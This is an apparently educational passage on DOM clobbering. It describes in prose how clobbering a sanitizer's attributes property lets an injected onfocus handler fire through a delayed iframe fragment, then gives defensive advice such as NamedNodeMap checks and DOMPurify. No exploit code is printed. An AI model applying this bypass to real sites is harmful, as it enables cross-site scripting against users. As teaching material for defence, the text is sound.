The library uses the attributes property to filter HTML attributes. However, it is still possible to clobber the attributes property itself, causing the length to be undefined. This allows us to inject any attributes we want into the form element. In this case, we use the onfocus attribute to smuggle the print() function.

When the iframe is loaded, after a 500ms delay, it adds the #x fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID "x", which is the form we created inside the comment. The onfocus event handler then calls the print() function.

------------------------------------------------------------------------------------------------------------------------------------
PREVENT DOM-CLOBBERING ATTACKS
------------------------------------------------------------------------------------------------------------------------------------

In the simplest terms, you can prevent DOM-clobbering attacks by implementing checks to make sure that objects or functions are what you expect them to be. For instance, you can check that the attributes property of a DOM node is actually an instance of NamedNodeMap. This ensures that the property is an attributes property and not a clobbered HTML element.

You should also avoid writing code that references a global variable in conjunction with the logical OR operator ||, as this can lead to DOM clobbering vulnerabilities.

In summary:

    Check that objects and functions are legitimate. If you are filtering the DOM, make sure you check that the object or function is not a DOM node.
    Avoid bad code patterns. Using global variables in conjunction with the logical OR operator should be avoided.
    Use a well-tested library, such as DOMPurify, that accounts for DOM-clobbering vulnerabilities.

DOM clobbering

DOM clobbering is an advanced technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the website. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL. 
